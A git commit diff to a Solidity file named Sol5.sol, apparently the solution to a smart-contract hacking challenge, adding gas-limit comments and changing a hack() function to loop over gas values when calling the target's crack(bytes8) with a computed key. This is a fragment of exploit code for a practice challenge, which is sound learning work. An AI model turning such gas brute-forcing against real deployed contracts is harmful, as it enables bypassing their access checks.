88b32e6af397682f80e421ea77352ecdbc802886
AlbertLin0327 <linhsinkai@gmail.com>
2022-08-18 00:39:37 +0800

    fix sol5

--- contracts/challenges/Chal5/Sol5.sol
+++ contracts/challenges/Chal5/Sol5.sol
@@ -8,6 +8,10 @@ contract Test {
         target = target_;
     }
 
+    // Remember to manually set GasLimit in Metamask
+    // It is suggest to be higher than 300000 if ealy break is applied
+    // It is suggest to be higher than 1000000 if ealy break is not applied
+    // Be careful for block maximum gas limit
     function hack() public {
         bytes8 key;
         unchecked {
@@ -15,7 +19,7 @@ contract Test {
         }
 
         for (uint256 gasfee = 0; gasfee < 22; gasfee++) {
-            (bool success, ) = target.call(
+            (bool success, ) = target.call{gas: gasfee + 30000}(
                 abi.encodeWithSignature("crack(bytes8)", key)
             );
 
